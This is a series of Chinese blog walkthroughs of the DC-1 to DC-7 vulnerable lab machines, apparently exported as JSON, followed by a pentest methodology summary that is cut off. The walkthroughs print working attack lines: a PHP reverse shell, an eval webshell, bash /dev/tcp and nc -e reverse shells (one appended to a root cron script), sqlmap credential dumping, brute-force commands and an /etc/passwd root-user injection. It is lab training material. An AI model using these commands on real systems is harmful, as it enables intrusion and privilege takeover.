[{"id":"c1eb72cb53103af9058bb7d0064dfe74","title":"DC-7靶机渗透","content":"DC-7靶机渗透全流程一:实验环境kali攻击机: 192.168.2.103\nDC-7靶机: 192.168.2.105\n二:信息收集主机发现arp-scan -l\n\n端口扫描1.masscan快速扫描端口\nmasscan --rate=10000 --ports 0-65535 192.168.2.105 \n\n发现80,22端口\n2.nmap精确扫描端口\nnmap -p22,80 -sV -A 192.168.2.105 \n\n已经发现cms是drupal 8\nweb信息收集1.访问192.168.2.105\n收集页面信息\ncms: Drupal 8\n\n目录扫描dirb http://192.168.2.105\n\n利用社工获取网页源码注意到网页底部有个足迹\n\n尝试利用搜索引擎搜索他一下\n\n可以看到这个作者的GitHub账号了,点进去看看\n\n继续点进这个项目看看,可以看到这就是提示了\n\n那这些就是网站源码了\n\n可以直接下载下来进行审计分析\n三:渗透测试信息获取将之前下载下来的网页源码解压\n\n查看config.php文件\ncat config.php\n得到了数据库的账号密码\n\n远程连接主机既然有了账号和密码,有没有可能之前扫描出来的22端口也能用呢]\\\n尝试远程连接\nssh dc7user@192.168.2.105\n\n连接成功\n修改admin密码先进行一下系统的信息收集\n可以看到权限挺低的\n\n用crontab -l查看计划任务,mail查看邮件\n\nCron Daemon不太清楚意思,查询试试\n\n那这里的意思大概就是root用户周期性的运行了一个系统任务,脚本的位置在/opt/scripts/backups.sh\n\n查看邮件后得知这个系统任务的大概意思是为数据库做一个备份,还给出了备份的位置\n\n查看下脚本的权限ls -l，发现www-data拥有执行和写的权限，我们当前权限没有写权限，看来没办法动手脚了。\n但是如果我们获得了www-data的shell 那就可以写点东西进去，然后依靠计划任务，用root去运行，那我们可以获得了root权限的shell了。\n\n注意到脚本里有一个drush命令\n\n可以看到命令是进入 cd &#x2F;var&#x2F;www&#x2F;html&#x2F; 后执行drush。\n\n然后去百度看看 drush是干什么呢？\n\nDrush(Drush &#x3D; Drupal + Shell)就是使用命令行命令来操作Drupal站点，它的命令格式与git类似，都是双字命令（drush + 实际的命令）。既然是命令行命令，也就可以使用其他脚本来实现相同的功能，比如编写shell脚本来实现相同的功能，也的确有不少人这样做过。但是，使用Drush要远优于编写自己的脚本，好处在于，一是可以利用Drush开发社区的力量，二是Drush的命令更加可靠，适用于更多变的环境。\n\nhttps:&#x2F;&#x2F;www.howtoing.com&#x2F;a-beginner-s-guide-to-drush-the-drupal-shell\n\n这里有写一些drush基本语法。\n\ndrush user-password admin --password&#x3D;&quot;new_pass&quot; \n#想要更改您的密码？就这么简单。\n#记得执行命令前先切换到Drupal的目录下面。\ncd &#x2F;var&#x2F;www&#x2F;html&#x2F;\n#Drupal默认账户是admin  123456为我修改的密码。\ndrush user-password admin --password&#x3D;123456\n\n\n修改成功\n获得www-data的shell登录网站后台\n\n进入后台,找到能写shell的地方\n在extend中找到可以安装模块\n\n下载一个php模块\n下载地址:https://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz\n直接安装\n\n\n启用php模块\n\n\n编辑文章\n\n此时可以看到,文章可以用php进行解析了\n\n写入一个 反弹shell脚本\n&lt;?php\n$sock &#x3D; fsockopen(&quot;192.168.2.103&quot;, &quot;444&quot;);\n$descriptorspec &#x3D; array(\n0 &#x3D;&gt; $sock,\n1 &#x3D;&gt; $sock,\n2 &#x3D;&gt; $sock\n);\n$process &#x3D; proc_open(&#39;&#x2F;bin&#x2F;sh&#39;, $descriptorspec, $pipes);\nproc_close($process);\n?&gt;\n\n\nkali开启nc监听\nnc -lvvp 444\n\n重新访问下主页\n\n反弹成功\n\n设置个交互式界面python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;\n\n可以看到,现在我们有向脚本里写入代码的权限了\n\n提权之前知道了,/opt/scripts/backup.sh会以root权限周期性的运行\n我们可以向backups.sh内写入反弹shell脚本,利用nc就可以完成\n然后如果是正常环境的话就等这个脚本运行的时候就成功了\necho &quot;nc -nv 192.168.2.103 4455 -e /bin/bash&quot; &gt;&gt;backups.sh\n\nkali开启侦听\nnc -nlvp 4455\n\n连接成功\n\n他这个默认十五分钟执行一次,等十五分钟就好啦\n得到flag\n\n\n","slug":"DC-7靶机渗透","date":"2023-01-05T14:52:06.100Z","categories_index":"渗透入门到入土","tags_index":"DC系列靶机","author_index":"Abyssaler"},{"id":"9ad4b35bee6dc5b3bef9da6cf161cc25","title":"DC-1靶机渗透详解","content":"dc-1靶机渗透过程详解一:实验环境kali攻击机:192.168.2.103\nDC-1靶机”192.168.1.128\n二:信息收集主机发现nmap -sP 192.168.1.0/24\n\n端口发现masscan --rate=10000 --ports 0-65535 192.168.1.128\n \n再利用nmap精细扫描端口\nnmap -T4 -sV -p22,80,111,38781 -A 192.168.1.128\n结果如下\n \n可以看到开放了两个重要端口22和80\n \n可以看到收集到了80端口的一系列敏感信息\n \n网站信息探测\n打开80端口对应的网站\n192.168.1.128:80\n \n利用插件找到了网站的cms\n三:渗透测试漏洞发现已知cms版本，搜索相应漏洞\n在漏洞库中找到对应版本我们可以利用的漏洞\n \n利用searchsploit drupal找到kali中保存的漏洞库\n \n打开msf\n \n搜索drupal漏洞\n \n调用漏洞模块\n \n利用info查看漏洞信息\n \n漏洞利用查看选项：show options命令\n指定靶机：set RHOSTS 192.168.1.128\n \n漏洞利用exploit命令\n \n可以看到得到了一个会话\n利用msf远程控制靶机\n \n进入交互式shell\npython -c ‘import pty;pty.spawn(“/bin/bash”)’\n \n找到第一个flag\n\n根据提示找到第二个flag\n \n找cms的配置文件\n \n看到配置文件里有数据库的账号和密码，尝试登录数据库\n \n\n登录成功\n查看user表中的信息\n \n\n可以看到密码被加密了，通过查阅资料可知密码是通过&#x2F;script&#x2F;password-hash.sh这个脚本进行的加密\n我们通过这个脚本自己修改一个密码\n \n在进入mysql数据库更新\n \n用我们之前自己设置的密码替换管理员密码\n用修改过的密码成功登录后台\n \n\n找到flag3\n\n通过cat &#x2F;etc&#x2F;passwd查看用户，找到flag4用户\n\n尝试用hydra对flag4用户暴力破解\nhydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.102 \n \n破解成功\n尝试远程登录\n \n找到第四个flag\n \n根据之前flag3的提示，我们知道了find这个命令有特殊的权限\n \n直接进行提权\n\n\n获得root权限\n \n拿到最后一个flag\n","slug":"DC-1靶机渗透","date":"2023-01-03T11:12:52.175Z","categories_index":"渗透入门到入土","tags_index":"DC系列靶机","author_index":"Abyssaler"},{"id":"1c7e747eafbee54a34e09632a5e7394e","title":"DC-3靶机渗透详解","content":"DC-3靶机渗透全流程一:实验环境攻击机:kali2022(192.168.2.103)\n靶机:dc-3(192.168.2.102)\n二:信息收集主机发现netdiscover -i eth0 -r 192.168.2.0/24\n\n发现目标主机\n端口扫描masscan --rate=100000 -p 0-65535 192.168.2.102\n\n没有扫描出结果\nnmap -T4 -sV -O -A -p- 192.168.2.102\n-T4(速度) -sV(版本扫描和开启的服务) -O(操作系统) -p-（全部端口）\n扫描出一个结果\n\n可以看到开启了80端口\n访问web页面访问192.168.2.102:80页面\n\n欢迎来到dc -3.\n这次，只有一面旗帜，一个入口，没有任何线索。\n要获得该标志，显然必须获得根权限。\n你如何成为根，取决于你自己，当然，也取决于系统。\n祝你好运，我希望你享受这个小小的挑战\n\n发现一个登录界面,经过尝试发现sql注入,暴力破解都没用\n目录发现dirsearch -u http://192.168.2.102/ -e*\n\n通过目录扫描发现了很多路径,访问看看\nhttp://192.168.2.102/administrator\n\n页面信息收集\n通过插件发现cms是joomia和wordpress\n通过查询得知有一个专门扫描joomla的工具joomscan\nkali里面安装joomscan工具的命令是apt-get install joomscan\njoomscan --url http://192.168.2.102开始扫描\n\n发现cms信息\n三:渗透测试漏洞发现用searchsploit搜索有无历史漏洞\nsearchsploit Joomla 3.7.0\n\n可以看到有一个sql注入漏洞能够利用\n漏洞利用cat /usr/share/exploitdb/exploits/php/webapps/42033.txt查看漏洞文件\n可以看到sqlmap的payload参数\nsqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]\n修改一下IP地址应该就能用了\npayload\nsqlmap -u &quot;http://192.168.2.102/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]\n\n成功爆出库名\n猜测我们要的数据在joomladb库里\n爆表名\nsqlmap -u &quot;http://192.168.2.102/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; --tables -p list[fullordering]\n\n成功爆出表名,注意到有一个表名非常敏感**#_users**\n爆字段\nsqlmap -u &quot;http://192.168.2.102/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns -p list[fullordering]\n\n成功爆出字段名\n继续爆破数据\nsqlmap -u &quot;http://192.168.2.102/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; -C id,nmae,password,username --dump -p list[fullordering]\n\n发现一个加密账号\n我们可以用若干方法进行解密,经过上网查询,发现可以用kali的john进行解密\njohn​\tJohn the Ripper 是一款大受欢迎的、免费的开源软件。也是一个基于字典的快速破解密码的工具，是一款用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的加密算法，如 DES 、 MD4 、 MD5 等。 John the Ripper 支持字典破解方式和暴力破解方式。它支持多种不同类型的系统架构，包括 Unix 、 Linux 、 Windows 、 DOS 模式、 BeOS 和 OpenVMS ，主要目的是破解不够牢固的 Unix/Linux 系统密码\n一些参考文章\n\n\n\n\n\n\n\n\n\nhttps://blog.csdn.net/i_can1/article/details/107227565\nhttps://www.cnblogs.com/HelloCTF/p/13346125.html\nhttps://www.cnblogs.com/Junglezt/p/16048189.html\n将密文放进dc-3.txt\n\njohn工具破解密码\n\n可以看到密文是snoopy,可以登录后台了\n\n\n成功登录后台\n植入一句话木马Joomla后台可编辑模板，修改源码，我们利用这个功能，在template下面创建一个 test.php，写入一句话，蚁剑成功连接\nshell 路径 http:&#x2F;&#x2F;192.168.2.102&#x2F;templates&#x2F;beez3&#x2F;111.php 密码 1\n\n&lt;?php @eval($_REQUEST[&#39;1&#39;]);?&gt;\n\n\n\n可以看到权限很低,想办法提权\n\n反弹一个shell 到kali上（后台编辑模板时，也可直接写入反弹shell脚本，访问触发)\n反弹shell命令\nbash一句话为：bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1\nnetcat: nc -e ip port &#x2F;bin&#x2F;bash\n\n这里这几个命令都不能成功,用下面这个\nbash -c &#39;bash -i &gt;&amp;  /dev/tcp/192.168.2.103/444 0&gt;&amp;1&#39;\n\n成功拿到shell\n提权查看内核版本信息\n\nlsb_release -a\n\n查询到目标靶机对应版本为 Ubuntu 16.04我们使用searchsploit查询是否有这个版本的漏洞\nsearchsploit Ubuntu 16.04\n\n查询到了很多有关的漏洞。这里我们使用39772进行提权\n提权思路：靶机上面是没有这个文件的，所以我们需要把这个文件cp到本地，再在kali渗透机上面搭建一个简易的服务器，操纵靶机下载这个文件并执行，拿到靶机root权限。\n查看文件\ncat /usr/share/exploitdb/exploits/linux/local/39772.txt\n查看漏洞介绍，并下载exp\n\n在得到的shell里下载并执行\nwget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip\n\n因为国内无法访问github所以一直失败,只能另寻他法\n开启kali的apache2服务：service apache2 start\n\n将文件复制到网页目录下：cp -r 39772 /var/www/html\n\n在靶机执行命令 wget http://192.168.2.103/39772.zip\n\n下载成功\n解压39772.zip文件unzip 39772.zip\ncd 39772\n\n解压exploit提权脚本tar包tar -xvf exploit.tar\ncd ebpf_mapfd_doubleput_exploit\n\n执行脚本，编译文件./compile.sh\n紧接着执行提权文件./doubleput\n\n成功提权至root\n找到flag\n\n","slug":"DC-3靶机渗透","date":"2023-01-02T02:52:18.139Z","categories_index":"渗透入门到入土","tags_index":"DC系列靶机","author_index":"Abyssaler"},{"id":"79fee45a8869c9b3b0169d3ea3ad8778","title":"DC-2靶机渗透详解","content":"DC-2靶机渗透全流程一:实验环境kali攻击机:192.168.2.103\n靶机:192.168.2.102\n二:信息收集主机发现:arp-scan -l\n\n端口发现masscan --rate=10000 -p 1-65535 192.168.2.102,以10000的速率扫描靶机的所有端口\n                                                                                                                                                                                                                \nnmap -p 80,7744 -sV -A 192.168.2.102   ,对指定端口的服务做综合详细扫描\n\n网站信息探测打不开192.168.2.108:80的原因:没有在本地设置hosts\n本地hosts文件位置:C:\\Windows\\System32\\drivers\\etc\n添加192.168.2.102 dc-2\n然后用ipconfig /flushdns更新dns缓存\n查询DNS缓存ipconfig /displaydns\nDNS解析顺序  本地DNS缓存&gt;hosts&gt;DNS服务器\n之后就能成功访问目标界面了\n\n利用Wappalyzer插件查看网站信息\n\n发现cms是wordpress\n找到flag1\n\n目录扫描dirsearch -u http://dc-2/ -e*  \n\n三:渗透测试通过flag1得知要用cewl工具收集网页信息生成密码破解口令字典\ncewlCewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。\n\n\n\n\n\n\n\n\n\nhttps://www.freebuf.com/articles/network/190128.html\n默认方法\n输入下列命令之后，爬虫会根据指定的URL和深度进行爬取，然后打印出可用于密码破解的字典：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F;\n\n\n\n保存字典文件\n为了方便大家记录，或者为将来的研究提供参考，Cewl可以将打印出的字典存储为文件。这里可以使用-w参数来将密码字典存储为text文件：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -w dict.txt\n\n我们可以使用下列命令查看密码字典是否存储成功，我们的存储路径为&#x2F;root &#x2F;dict.txt：\ncat dict.txt\n\n\n\n生成特定长度的字典\n如果你想生成指定长度的密码字典，你可以使用-m选项来设置：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -m 9\n\n上述命令将生成长度至少为9位的密码，，Cewl对目标网站进行了爬取，并打印出了长度至少为9位的密码\n从网站中获取Email\n你可以使用-e选项来启用Email参数，并配合-n选项来隐藏工具在爬取网站过程中生成的密码字典：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -n -e\n\n此时，工具成功在网站中发现了一个Email地址\n计算网站字典中重复的单词数量\n如果你想要计算目标网站中某个词的重复出现次数，你可以使用-c选项来开启参数计算功能：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -c\n\nCewl可以直接统计出目标网站中重复的单词数量\n增加爬取深度\n如果你想增加爬虫的爬取深度以生成更大的字典文件，你可以使用-d选项来指定爬取深度，默认的爬取深度为2：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -d 3\n\n\n\n提取调试信息\n你可以使用–debug选项来开启调试模式，这样就可以查看网站爬取过程中出现的错误和元数据了：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; --debug\n\n\n\nVerbose模式\n为了扩展网站爬取结果，并获取更加完整的数据报告，你可以使用-v选项来进入verbose模式。该模式下，Cewl会导出目标网站的详细数据：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -v\n\n\n\n生成包含数字和字符的字典\n如果你想生成包含数字和字符的字典文件，你可以在命令中使用–with-numbers选项：\ncewl http:&#x2F;&#x2F;testphp.vulnweb.com&#x2F; --with-numbers\n\n\n\nCewl摘要&#x2F;基础认证\n如果目标网站需要进行页面登录认证的话，我们就要使用下列参数来绕过页面认证的限制：\n–auth_type:                      Digest or basic.\n–auth_user:                     Authentication username.\n–auth_pass:                     Authentication password.\ncewl http:&#x2F;&#x2F;192.168.1.105&#x2F;dvwa&#x2F;login.php --auth_type Digest --auth_user admin--auth_pass password -v\n\n或者\ncewl http:&#x2F;&#x2F;192.168.1.105&#x2F;dvwa&#x2F;login.php --auth_type basic --auth_user admin--auth_pass password -v\n\n接收到的http响应码为200，并成功生成了字典\n代理URL\n如果目标网站设置了代理服务器的话，Cewl将无法使用默认命令来生成字典。此时你需要使用–proxy option选项来启用代理URL功能：\ncewl --proxy_host 192.168.1.103 --proxy_port 3128 -w dict.txt http:&#x2F;&#x2F;192.168.1.103&#x2F;wordpress&#x2F;\n\n\n\n使用cewl生成字典\ncewl http://dc-2 -w de-2.txt\n\nwpscan​\tWPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。\n\n\n\n\n\n\n\n\n\nhttps://www.freebuf.com/sectool/174663.html\nhttps://blog.csdn.net/liver100day/article/details/117585795\n扫描WordPress站点\n我们可以使用–enumerate选项来扫描并发现关于目标站点主题、插件和用户名信息。输入下列命令开始对服务器进行扫描：\nwpscan --url http:&#x2F;&#x2F;dc-2\n\n如果你不知道目标服务器的IP地址，你可以直接输入URL地址。\n主题扫描\n使用下列命令对主题进行扫描：\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate t\n\n使用下列命令扫描主题中存在的漏洞：\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate vt\n\n枚举用户信息\nwpscan --url http:&#x2F;&#x2F;dc-2 -e u\n\n\n\n插件扫描\n插件可以扩展WordPress站点的功能，但很多插件中都存在安全漏洞，而这也会给攻击者提供可乘之机。\n我们可以使用下列命令扫描WordPress站点中安装的插件：\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate p\n\n接下来，我们可以使用下列命令来扫描目标插件中的安全漏洞：\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate vp\n\n\n\n使用wpscan进行暴力破解\nwpscan --url http:&#x2F;&#x2F;dc-2 -P &#x2F;home&#x2F;liver100day&#x2F;桌面&#x2F;dc2_passwords.txt -U &#x2F;home&#x2F;liver100day&#x2F;桌面&#x2F;dc2_username.txt\n\n\n\n命令集合\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate vp,vt,tt,u\n\n\n\n用wpscan收集用户信息\nwpscan --url http://dc-2 -e u枚举用户信息\n\n生成用户名字典\ncat &gt;&gt; dc-2-u.txt &lt;&lt; end\n\n对http用户进行暴力破解\nwpscan --url http://dc-2 -P dc-2.txt\n\n破解成功\n| Username: jerry, Password: adipiscing\n| Username: tom, Password: parturient\n\n\n\n利用用户信息进行登录\n\n找到flag2\n\n利用破解的账号尝试登录系统\n有时候一些程序用户很可能是系统用户\n利用ssh进行登录\nssh -p 7744 tom@192.168.2.102\nssh -p 7744 jerry@192.168.2.102\n\n\n成功登录tom\n发现flag3,但是同时发现很多指令不能使用\n\nrbash逃逸一些参考文章\n\n\n\n\n\n\n\n\n\nhttps://xz.aliyun.com/t/7642\nhttps://blog.csdn.net/qq_43168364/article/details/111830233\n查看路径搜索变量PATH\necho $PATH\n\n查看还有哪些命令能用\nls /home/tom/usr/bin\n\n用vi打开flag3\nvi flag3.txt\n\n打开后输入冒号,在vi编辑器的底部输入逃逸命令!/bin/sh\n\n但是我们直接输会遇到限制,过滤了&#x2F;\n\n转变思路,用set设置环境变量\n:set shell=/bin/sh通过set方式设置一个变量,把shell赋值给这个变量\n:shell\n\n\n\n成功绕过\n这里补充下正常Linux进入shell命令行的方法,直接输入/bin/sh\n\n此时发现很多命令仍然不能使用\n\n但可以发现此时提示的是命令没有找到,而不是权限不够,证明我们是能够使用这些命令的,只要路径正确\n\n路径搜索变量PATH变量是Linux系统存储可执行文件搜索路径的地方，等价于Windows系统的Path变量\necho $PATH\nexport PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games  把变量输出为全局变量\n\n此时就能正常使用命令了\n\n切换到jerry用户\nsu - jerry\n\n发现jerry只是个普通用户,想办法提权\n先找到flag4\n\n通过提示知道了要用git提权\n通过sudo -l查看可利用的指令\n发现可以用root权限执行git\n\n利用git提权这里用git提权，原理是git存在缓冲区溢出漏洞，在使用sudo git -p help时，不需要输入root密码即可以root权限执行这条命令。\nsudo git -p\n之后输入\n!/bin/bash\n这个-p的意思就是以分页的形式展示git的帮助信息,但是这里他会默认调用more来进行展示\n参考之前的rbash逃逸\n\n或者\nsudo git help config\n在末行命令模式输入 \n!/bin/bash 或 !&#39;sh&#39; \n完成提权\n拿到最终flag\n\n","slug":"DC-2靶机渗透","date":"2023-01-01T00:23:50.749Z","categories_index":"渗透入门到入土","tags_index":"DC系列靶机","author_index":"Abyssaler"},{"id":"8aa0eabc00f42d8e334768d53e646906","title":"DC-4靶机渗透详解","content":"DC-4靶机渗透全流程一：实验环境靶机：DC-4（192.168.1.132）\n攻击机：kali2022.2（192.168.1.133）\n二：信息收集主机发现主机扫描：利用arp-scan工具扫描本地网络\n命令：arp-scan -l   扫描本地网络\n这里我是用的桥接模式，所以会同时扫描到同一网段中的其他主机\n\n发现其中有明显VMware特征的主机，就是dc-4靶机\n或者nmap -sn 192.168.1.0/24\n或者netdiscover -i eth0 -r 192.168.1.0/24\n都可以进行主机发现\n端口扫描nmap -A 192.168.1.132   综合扫描(开放的端口,服务版本,操作系统类型等)\n\n指纹识别whatweb 192.168.1.132\n\n目录扫描dirsearch -u http://192.168.1.132:80/ -e*\n\nweb页面信息\n信息收集总结\nIP &#x3D;&gt; 192.168.1.132\n开放的端口：\n22 &#x3D;&gt; ssh服务 —- OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)\n80 &#x3D;&gt; http服务 —- nginx 1.15.10\n\n\nOS &#x3D;&gt; Linux 3.2 - 4.9(debian)\nlinux kernel &#x3D;&gt; 3&#x2F;4\nnginx &#x3D;&gt; 1.15.10\n扫描出来的网站目录\n\n三：渗透测试一共就两个端口,一个一个试试咯\n22端口爆破没有更多信息,直接用hydra爆破试试\nhydra -l root -P /usr/share/wordlists/dirb/small.txt -vV -t 10 -o ssh.txt 192.168.1.132 ssh -s 22\n\n爆破失败,当然如果时间足够的话应该可以用大字典跑出来,这里先试试其他办法\n80端口\n显而易见的一个登录框,看到标题里有admin,猜测这个可能是用户名,再用burp爆破试试\n\n抓包,对密码进行爆破\n\n还真跑出结果来了\n\n密码是happy\n\n成功登录\n命令执行漏洞利用登进来后发现是命令执行的地方,猜测可能要用命令执行漏洞了\n\n有两个地方可以修改命令\n法一我们可以在前端修改代码,执行其他命令\n\n先改成whoami试试\n\n命令执行成功了\n\n法二burp suite抓包该数据\n\n发送到重放器中修改试试\n这里我修改成ls，发现返回的结果跟着发生了变化\n\n证明方法是可行的\n反弹shell既然能执行命令,也找不到其他突破口了,想到反弹shell\n首先测试靶机有没有nc工具\nwhich nc\n\nwhich命令的作用是，在PATH变量指定的路径中，搜索某个系统命令的位置，并且返回第一个搜索结果。. 也就是说，使用which命令，就可以看到某个系统命令是否存在，以及执行的到底是哪一个位置的命令。\n语法:which [文件...]\n\nnc 是 Linux下强大的网络命令行工具，主要用于 TCP、UDP、UNIX域套接字 相关的操作。它被设计成可以由其他程序灵活驱动可靠的后台工具，拥有 &quot;瑞士军刀&quot; 的美称\n\n结果是有的,开始反弹shell\nkali开启监听888端口\nnc -l -p 888\n-l 使用监听模式，管控传入的资料。\n-p&lt;通信端口&gt; 设置本地主机使用的通信端口。\n\n\n靶机把shell传过去\nnc -nv 192.168.1.133 888 -c /bin/bash\n-c 传递一个shell命令,&#x2F;bin&#x2F;bash就相当把受害主机的shell传过去了\n-n 不做名称解析,提高连接速度\n-v 显示详细信息\n\n\n反弹成功\n\n这样看太麻烦了，获取一个交互式的shell\npython -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;\n\n横向移动首先查看账户信息\ncat /etc/passwd\n\n注意到几个明显像是用户的id\n用ls /home验证\n\n开始信息收集\n\n发现一些目录,继续收集,然后看到了一个及其敏感的文件\n\n通过当前文件夹的名字和.bak后缀猜测这就是用户有关密码的备份文件\n这个时候当然要查看了\n\n查看一共有多少行命令\ncat old-passwords.bak | wc -l\n\n把受害者主机中的文件拷贝到kali主机\nscp /home/jim/backups/old-passwords.bak root@192.168.1.133:~/Desktop\n\n\n把用户名写入username.txt\n\n有用户名，有密码了，尝试用hydra破解远程的主机\nhydra -L username.txt -P old-passwords.bak 192.168.1.132 ssh\n\n经过漫长的等待后爆破成功\n\n用kali凭借jim用户登录系统,进入远程主机\nssh jim@192.168.1.132\n\n继续信息收集\n\n这个脚本好像没什么有用信息，但里面提示有bash，可能要提权\n继续查看mbox，好像是一封邮件，里面有许多有用信息\n\n提权利用kali的searchsploit查询漏洞\nsearchsploit exim\n\n可以看到这个邮箱系统是有漏洞的,可以利用这个漏洞提权,这里先不用,还有其他提权的办法\n查看邮件客户端 mail\n\n可以看到有一封邮件，输入邮件编号1查看内容\n\n可以看到邮件内容里直接就有密码。。。话说这公司心真大啊\n尝试一下sudo\n\n提示没有权限，要想办法提权了\n很幸运的，我们获得了另一个用户charles的id和password，尝试切换下用户\n\n提示我们可以用root权限去使用teehee命令\necho &quot;hack::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd\n\n提权成功!\n找到flag\n\n","slug":"DC-4靶机渗透","date":"2022-12-21T10:35:38.148Z","categories_index":"渗透入门到入土","tags_index":"DC系列靶机","author_index":"Abyssaler"},{"id":"0b33f130611717392cbc4a9bd7091bfa","title":"渗透测试流程心得总结","content":"渗透测试流程心得总结因为渗透测试过程非常复杂且涉及到的知识点极多，为了防止自己遗忘同时方便快速查阅，将渗透测试全流程以及其中涉及到的各种知识总结下来\n1.确定目标确定你要渗透的目标，这里的前提是我们得经过用户的授权，才可以对网站进行渗透。不然如果我们没有经过客户的授权而对一个网站进行渗透测试的话，这是违法的！\n渗透测试分为 白盒测试 和 黑盒测试\n\n白盒测试就是在知道目标网站源码和其他一些信息的情况下对其进行渗透，有点类似于代码分析\n黑盒测试就是只告诉我们这个网站的url，其他什么都不告诉，然后让你去渗透，模拟黑客对网站的渗透\n\n2.信息收集（灵魂！！！）信息收集这一步及其重要，可以说信息收集的好坏直接影响了后续渗透的难易程度以及最终的结果\n有一句话说的很好,信息收集是渗透测的灵魂\n2-1.网站信息收集2-1-1.发现活动主机arp-scanarp-scan是Kali Linux自带的一款ARP扫描工具。该工具可以进行单一目标扫描，也可以进行批量扫描。批量扫描的时候，用户可以通过CIDR地址范围或者列表文件的方式指定。该工具允许用户定制ARP包，构建非标准数据包。同时，该工具会自动解析Mac地址，给出MAC对应的硬件厂商，帮助用户确认目标。\n使用方式：arp-scan option [rhost]\n常用指令：\n-f 从指定文件中读取主机名或地址：arp-scan -f IP.txt\n-l从网络接口配置生成地址 arp-scan -l\n-i 各扫描之间的时间差 ：arp-scan -l -i 1000\n-r 每个主机扫描次数 : arp-scan -r 5\n-V显示程序版本并退出\n-t 设置主机超时时间 : arp-scan -t 1000 10.10.10.0&#x2F;24\n-I使用网络接口 : arp-scan -I eth0\n-g不显示重复的数据\n-D显示数据包往返时间\n\n命令arp-scan -l\n\nnmap系统漏洞扫描之王-nmap\nNMap，也就是Network Mapper，是Linux下的网络扫描和嗅探工具包。\n常用命令:\nnmap -sP -v 192.168.1.0&#x2F;24 &#x2F;&#x2F; 对本地网络进行扫描并列出详细信息\nnmap -sP 192.168.123.1&#x2F;24 &#x2F;&#x2F;Ping扫描\nnmap -p0 192.168.123.1&#x2F;24 &#x2F;&#x2F;无ping扫描,可避免防火墙的发现\nnmap -PS 192.168.123.1&#x2F;24 &#x2F;&#x2F;TCP Syn Ping即传输层的TCP&#x2F;IP扫描，通过发送和接收报文的形式进行扫描，在这种情况下每个端口都会轻易的被发现。\nnmap -PA 192.168.123.1&#x2F;24 &#x2F;&#x2F;很多防火墙会封锁SYN报文，所以nmap提供了SYN和ACK两种扫描方式，这两者的结合大大的提高了逃避防火墙的概率。\n#在实际中我们通常将ps和pa两个参数放到一起，这样效果会更好。\nnmap -PU 192.168.123.1&#x2F;24 &#x2F;&#x2F;使用UDP扫描，nmap会发送一个空的报文到主机，如果返回则说明设备在线\nnmap -PR 192.168.123.1&#x2F;24 &#x2F;&#x2F;ARP扫描是nmap对目标进行一个apr ping扫描的过程，尤其在内网的情况下。因为在本地局域网防火墙是不会禁止ARP请求的。所以在内网中使用apr扫描时非常有效的。\nnmap -sL 192.168.123.1&#x2F;24 &#x2F;&#x2F;列表扫描，他仅仅是列出制定网络上的每台主机，不发送任何报文给目标,但会列出一些无用的信息\n\n\n命令nmap -sn 192.168.1.0/24\n\nnetdiscovernetdiscover是一种用于收集有关网络的所有重要信息的工具。 它收集有关已连接客户端和路由器的信息。 对于连接的客户端，我们将能够知道他们的IP，MAC地址和操作系统，以及他们在其设备中打开的端口。 至于路由器，它将帮助我们了解路由器的制造商。 然后，如果我们试图破解它们，我们将能够查找可以用于客户端或路由器的漏洞。\nnetdiscover -i eth0 -r 192.168.2.0&#x2F;24   \n&#x2F;&#x2F;IP地址是192.168.2.0网段，子网掩码是255.255.255.0，3个255的掩码位是24(需要网络知识基础),使用netdiscover工具对该网段进行局域网存活主机探测\n\nnetdiscover 